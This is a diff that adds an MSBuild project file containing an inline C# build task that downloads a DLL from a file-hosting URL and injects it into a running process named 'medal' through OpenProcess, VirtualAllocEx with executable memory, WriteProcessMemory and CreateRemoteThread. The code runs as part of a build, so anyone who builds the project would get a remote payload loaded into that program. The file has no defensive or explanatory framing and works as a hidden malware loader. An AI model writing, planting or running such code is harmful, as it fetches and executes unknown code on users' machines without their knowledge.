@@ -1,0 +1,55 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="InjectMedal">
+    <UsingTask TaskName="InjectTask" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+      <ParameterGroup />
+      <Task>
+        <Using Namespace="System"/>
+        <Using Namespace="System.Net"/>
+        <Using Namespace="System.Diagnostics"/>
+        <Using Namespace="System.Runtime.InteropServices"/>
+        <Code Type="Fragment" Language="cs">
+          <![CDATA[
+            public class InjectTask : Microsoft.Build.Utilities.Task {
+                [DllImport("kernel32.dll", SetLastError=true)]
+                static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+                [DllImport("kernel32.dll", SetLastError=true)]
+                static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+                [DllImport("kernel32.dll", SetLastError=true)]
+                static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+                [DllImport("kernel32.dll", SetLastError=true)]
+                static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+                [DllImport("kernel32.dll", SetLastError=true)]
+                static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+                [DllImport("kernel32.dll", SetLastError=true)]
+                static extern bool CloseHandle(IntPtr hObject);
+
+                public override bool Execute() {
+                    try {
+                        byte[] dllBytes = new WebClient().DownloadData("https://files.catbox.moe/8u7enc.dll");
+                        Process target = null;
+                        foreach (Process p in Process.GetProcesses())
+                            if (p.ProcessName.Equals("medal", StringComparison.OrdinalIgnoreCase)) { target = p; break; }
+                        if (target == null) return true;
+
+                        IntPtr hProcess = OpenProcess(0x1F0FFF, false, target.Id);
+                        if (hProcess == IntPtr.Zero) return false;
+                        IntPtr allocAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length, 0x3000, 0x40);
+                        if (allocAddr == IntPtr.Zero) return false;
+                        if (!WriteProcessMemory(hProcess, allocAddr, dllBytes, (uint)dllBytes.Length, out _)) return false;
+                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocAddr, IntPtr.Zero, 0, IntPtr.Zero);
+                        if (hThread == IntPtr.Zero) return false;
+                        WaitForSingleObject(hThread, 5000);
+                        CloseHandle(hThread);
+                        CloseHandle(hProcess);
+                        return true;
+                    } catch { return false; }
+                }
+            }
+          ]]>
+        </Code>
+      </Task>
+    </UsingTask>
+    <InjectTask />
+  </Target>
+</Project>
